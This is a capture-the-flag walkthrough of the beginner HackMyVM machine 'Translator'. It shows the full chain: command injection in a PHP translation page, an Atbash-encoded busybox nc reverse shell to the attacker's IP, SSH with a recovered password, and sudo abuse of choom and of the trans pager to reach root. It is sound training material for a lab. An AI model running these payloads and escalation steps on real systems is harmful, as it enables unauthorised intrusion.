# Translator

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Translator | sml | Beginner | HackMyVM |

**Summary:** Translator is a beginner-level Linux machine hosted on HackMyVM that demonstrates a multi-stage attack path involving command injection, credential discovery through custom translation logic, and privilege escalation via misconfigured sudo permissions. The initial foothold is gained by exploiting a command injection vulnerability in a web-based translation application that uses an Atbash cipher (reverse alphabet substitution) combined with character replacement. Despite using `escapeshellcmd()`, the application is vulnerable because shell metacharacters like semicolons remain functional. By injecting shell metacharacters, an attacker can execute arbitrary commands and establish a reverse shell as the `www-data` user. Enumeration reveals an encoded secret file containing the password for the `ocean` user. Lateral movement to the `india` user is achieved by exploiting sudo permissions on the `choom` binary, which allows spawning an interactive shell. Final privilege escalation to root is accomplished by abusing sudo access to the `trans` translation utility, which opens a man page viewer that can be escaped to execute commands as root. This machine emphasizes the importance of proper input validation (escapeshellcmd is insufficient), secure credential storage, and principle of least privilege in sudo configurations.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying live hosts on the target network. Using a PowerShell network scanning script, we enumerate the subnet to locate virtual machine targets.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.78 08:00:27:8B:A3:CC VirtualBox
```

**Target identified:** `192.168.100.78` (VirtualBox VM)

### Port Scanning & Service Enumeration

With the target IP confirmed, we perform a comprehensive port scan using Nmap to identify open services and their versions. The `-sC` flag enables default scripts, `-sV` performs version detection, and `-p-` scans all 65,535 TCP ports.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/translator]
└─$ nmap -sC -sV -p- 192.168.100.78
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 16:33 WIB
Nmap scan report for 192.168.100.78
Host is up (0.0060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
|_  256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 8.4p1 Debian 5 - standard SSH service, requires credentials
- **Port 80 (HTTP):** nginx 1.18.0 - web server, primary attack surface
- **Operating System:** Linux (Debian-based)

The web server on port 80 is our most promising entry point.

---

## Initial Access

### Web Application Analysis

Accessing the web application at `http://192.168.100.78`, we discover an "HMV Translator" service. This application appears to perform text translation using a custom character substitution algorithm.

### Discovering Command Injection

Testing for command injection vulnerabilities, we attempt to inject shell metacharacters into the translation input. When we send the payload `; id`, the application processes it and reveals unexpected behavior:

![](image.png)

**Translation result:** `; rw`

The characters are being transformed (`id` → `rw`), indicating the application is performing character substitution. However, the fact that the input is being processed suggests potential command execution.

### Confirming Remote Code Execution

To confirm command execution, we need to reverse the translation. Since `id` becomes `rw` through the Atbash cipher, we send the payload `; rw`, which will be transformed back to `; id` when processed:

![](image-1.png)

**Translation result:** `; id uid=33(www-data) gid=33(www-data) groufs=33(www-data)`

**Success!** The output shows command execution as the `www-data` user. The application is vulnerable to command injection despite the use of `escapeshellcmd()`. The output is then translated through the Atbash cipher and character replacement, which is why we see slightly modified text (e.g., "groups" becomes "groufs" due to the p→f transformation).

### Establishing Reverse Shell

Now that we have confirmed RCE, we need to establish a persistent reverse shell. 

#### Setting Up the Listener

On our attack machine, we start a Netcat listener to catch the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/translator]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Crafting the Payload

We use `busybox nc` with the `-e` flag to execute `/bin/bash` upon connection:

**Target command:** `; busybox nc 192.168.100.1 4444 -e /bin/bash`

To bypass the Atbash cipher, we need to pre-encode our payload. Applying the reverse Atbash transformation:
- `busybox` → `yfhbylc`
- `nc` → `mx`
- `-e` → `-v`
- `/bin/bash` → `/yrm/yzhs`

**Pre-encoded payload:** `; yfhbylc mx 192.168.100.1 4444 -v /yrm/yzhs`

We submit the pre-encoded version through the web interface:

![](image-2.png)

The application translates it back to the original command and executes it, establishing our reverse shell.

#### Receiving the Shell

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/translator]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59322
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@translator:~/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/translator]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@translator:~/html$
```

We upgrade to a fully interactive TTY using Python's `pty` module and proper terminal settings. We now have a stable shell as `www-data`.

---

## Privilege Escalation

### User Enumeration - www-data to ocean

#### Understanding the Application Source Code

Now that we have shell access, we can examine the vulnerable PHP code to understand exactly how the translation and command injection work:

```bash
www-data@translator:~/html$ ls
hvxivg  index.html  translate.php
```

Examining the translation script:

```bash
www-data@translator:~/html$ cat translate.php
<?php
$test = $_GET['hmv'];
$test = escapeshellcmd($test);
echo ("Translated to:");
echo "<br>";
$ultima_linea = system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba');
$ulti = system('echo '.$ultima_linea.'| tr "php" "wtf"');
?>
```

**Detailed Code Analysis:**

1. **Line 2:** `$test = $_GET['hmv'];` - Retrieves user input from the GET parameter `hmv`

2. **Line 3:** `$test = escapeshellcmd($test);` - Attempts to sanitize input using `escapeshellcmd()`
   - **Critical flaw:** This function escapes characters like `#`, `&`, backticks, pipes, but **DOES NOT escape semicolons (`;`)**
   - Semicolons allow command chaining in shell, making this insufficient protection

3. **Line 6:** `system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba');`
   - Executes the user input through `system()`
   - Applies **Atbash cipher** - reverses the alphabet (a↔z, b↔y, c↔x, d↔w, e↔v, etc.)
   - Example: `hello` → `svool`, `id` → `rw`
   - The result is stored in `$ultima_linea`

4. **Line 7:** `system('echo '.$ultima_linea.'| tr "php" "wtf"');`
   - Takes the output from the first translation
   - Applies character replacement: `p` → `w`, `h` → `t`, `p` → `f`
   - Example: `groups` → `groufs` (the 'p' becomes 'f')

**Why the vulnerability exists:**
- The double `system()` call executes shell commands with our injected input
- Because `;` is not escaped, we can chain commands like `; id`, `; whoami`, `; nc ...`
- Our commands get executed BEFORE the `tr` transformation, but the OUTPUT gets translated
- This explains why we see translated results like `rw` (which is `id` after Atbash) in the web interface

#### Discovering Hidden Files

An unusual file named `hvxivg` stands out. Testing it through the translation web interface reveals its meaning:

![](image-3.png)

**Decoded:** `hvxivg` translates to `secret`

This is a strong indicator that the file contains sensitive information.

#### Discovering Encoded Credentials

Examining the contents of the secret file:

```bash
www-data@translator:~/html$ cat hvxivg
Mb kzhhdliw rh z[REDACTED]
```

The content appears to be encoded using the same translation algorithm. We submit this string to the web interface to decode it:

![](image-5.png)

**Decoded message:** `My password is a[REDACTED]`

We've discovered a password! Now we need to identify which user it belongs to.

#### Identifying Target Users

```bash
www-data@translator:~/html$ ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 May 11  2022 .
drwxr-xr-x 18 root  root  4096 May 11  2022 ..
drwxr-xr-x  2 india india 4096 May 11  2022 india
drwxr-xr-x  3 ocean ocean 4096 May 11  2022 ocean
www-data@translator:~/html$ ls -la /home/india
total 20
drwxr-xr-x 2 india india 4096 May 11  2022 .
drwxr-xr-x 4 root  root  4096 May 11  2022 ..
lrwxrwxrwx 1 india india    9 May 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 india india  220 May 11  2022 .bash_logout
-rw-r--r-- 1 india india 3526 May 11  2022 .bashrc
-rw-r--r-- 1 india india  807 May 11  2022 .profile
www-data@translator:~/html$ ls -la /home/ocean
total 32
drwxr-xr-x 3 ocean ocean 4096 May 11  2022 .
drwxr-xr-x 4 root  root  4096 May 11  2022 ..
-rw------- 1 ocean ocean   56 May 11  2022 .Xauthority
lrwxrwxrwx 1 ocean ocean    9 May 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ocean ocean  220 May 11  2022 .bash_logout
-rw-r--r-- 1 ocean ocean 3526 May 11  2022 .bashrc
drwxr-xr-x 3 ocean ocean 4096 May 11  2022 .local
-rw-r--r-- 1 ocean ocean  807 May 11  2022 .profile
-rw------- 1 ocean ocean   20 May 11  2022 user.txt
```

Two users exist: `india` and `ocean`. The user flag (`user.txt`) is in ocean's home directory, suggesting this is our next target.

#### SSH Access as ocean

Using the discovered password `a[REDACTED]`, we attempt SSH authentication as the `ocean` user:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/translator]
└─$ ssh ocean@192.168.100.78
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
ocean@192.168.100.78's password:
Linux translator 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64
...
ocean@translator:~$ id
uid=1000(ocean) gid=1000(ocean) grupos=1000(ocean),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

**Success!** We now have legitimate SSH access as the `ocean` user.

### Privilege Escalation - ocean to india

#### Sudo Privilege Enumeration

Checking sudo permissions for the ocean user:

```bash
ocean@translator:~$ sudo -l
Matching Defaults entries for ocean on translator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ocean may run the following commands on translator:
    (india) NOPASSWD: /usr/bin/choom
ocean@translator:~$ ls -la /usr/bin/choom
-rwxr-xr-x 1 root root 51432 ene 20  2022 /usr/bin/choom
ocean@translator:~$ file /usr/bin/choom
/usr/bin/choom: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cadcb44786665809e672e136da9f8c6fd032b2e, for GNU/Linux 3.2.0, stripped
```

**Key Finding:** User `ocean` can execute `/usr/bin/choom` as user `india` without a password.

#### Understanding choom

Checking the help documentation:

```bash
ocean@translator:~$ sudo -u india /usr/bin/choom --help

Modo de empleo:
 choom [opciones] -p pid
 choom [opciones] -n número -p pid
 choom [opciones] -n número [--] orden [args...]]

Muestra y ajusta la puntuación de matador OOM.

Opciones:
 -n, --adjust <num>     especifica el valor de ajuste de puntuación
 -p, --pid <num>        ID de proceso

 -h, --help             muestra esta ayuda
 -V, --version          muestra la versión

Para más detalles véase choom(1).
```

The `choom` utility is designed to display and adjust the OOM (Out-Of-Memory) killer score. Importantly, it can execute commands with the `-n` flag.

#### GTFOBins Research

Consulting [GTFOBins](https://gtfobins.github.io/gtfobins/choom/) for exploitation techniques:

![](image-6.png)

**Exploitation Method:** `choom -n 0 /bin/bash`

This command spawns a bash shell while setting the OOM adjustment to 0.

#### Escalating to india

```bash
ocean@translator:~$ sudo -u india /usr/bin/choom -n 0 /bin/bash
india@translator:/home/ocean$ id
uid=1001(india) gid=1001(india) grupos=1001(india)
```

**Success!** We are now operating as the `india` user.

### Privilege Escalation - india to root

#### Enumerating india's Sudo Privileges

```bash
india@translator:/home/ocean$ sudo -l
Matching Defaults entries for india on translator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User india may run the following commands on translator:
    (root) NOPASSWD: /usr/local/bin/trans
india@translator:/home/ocean$ file /usr/local/bin/trans
/usr/local/bin/trans: Bourne-Again shell script, UTF-8 Unicode text executable, with very long lines
india@translator:/home/ocean$ ls -la /usr/local/bin/trans
-rwxr-xr-x 1 root root 200854 may 11  2022 /usr/local/bin/trans
```

**Key Finding:** User `india` can execute `/usr/local/bin/trans` as `root` without a password.

#### Analyzing the trans Binary

The `trans` utility appears to be a translation tool (likely the translate-shell project):

```bash
india@translator:/tmp$ sudo /usr/local/bin/trans -h
Usage:  trans [OPTIONS] [SOURCES]:[TARGETS] [TEXT]...

Information options:
    -V, -version
        Print version and exit.
    -H, -help
        Print help message and exit.
    -M, -man
        Show man page and exit.
    -T, -reference
        Print reference table of languages and exit.
    -R, -reference-english
        Print reference table of languages (in English names) and exit.
    -L CODES, -list CODES
        Print details of languages and exit.
    -S, -list-engines
        List available translation engines and exit.
    -U, -upgrade
        Check for upgrade of this program.
...
```

The `-M` option displays the man page, which typically uses a pager like `less` or `more`.

#### Exploiting Man Page Pager

Man pages are displayed using pager programs that support interactive commands. We can escape from the pager to execute shell commands.

**Exploitation steps:**

```bash
india@translator:/home/ocean$ sudo -u root /usr/local/bin/trans -M
```

Once the man page opens, we type the following command to escape to a shell:

```
!/bin/bash
```

The exclamation mark (`!`) in `less`/`more` allows executing external commands.

#### Obtaining Root Access

```bash
root@translator:/home/ocean# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
translator
root@translator:/home/ocean# cd
root@translator:~# cat /root/root.txt /home/ocean/user.txt
h87[REDACTED]
a67[REDACTED]
```

**Root achieved!** We have successfully escalated to root privileges and captured both flags.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning to identify target IP `192.168.100.78`, followed by comprehensive port scanning revealing SSH (22) and HTTP (80) services running on a Debian Linux system.

2. **Vulnerability Discovery**: Analyzed the "HMV Translator" web application and discovered a command injection vulnerability. Despite using `escapeshellcmd()`, the application remained vulnerable because semicolons are not escaped, allowing command chaining. The application uses an Atbash cipher (reverse alphabet) combined with character replacement (`tr "php" "wtf"`) before executing commands via `system()`.

3. **Exploitation**: Leveraged the command injection vulnerability by pre-encoding a reverse shell payload using the Atbash cipher. The encoded payload `; yfhbylc mx 192.168.100.1 4444 -v /yrm/yzhs` was submitted, which translated back to `; busybox nc 192.168.100.1 4444 -e /bin/bash` and executed, establishing a reverse shell as the `www-data` user.

4. **Credential Discovery**: Enumerated the web directory and discovered an encoded secret file (`hvxivg`). Decoded the file contents using the translation service to reveal the password `a[REDACTED]` for the `ocean` user. Successfully authenticated via SSH.

5. **Lateral Movement (ocean → india)**: Exploited misconfigured sudo permissions allowing `ocean` to execute `/usr/bin/choom` as `india` without a password. Used the GTFOBins technique `sudo -u india choom -n 0 /bin/bash` to spawn an interactive shell as the `india` user.

6. **Privilege Escalation (india → root)**: Identified sudo permission allowing `india` to execute `/usr/local/bin/trans` as root. Exploited the man page viewer by running `sudo trans -M` and escaping with `!/bin/bash`, successfully obtaining a root shell and capturing both user and root flags.
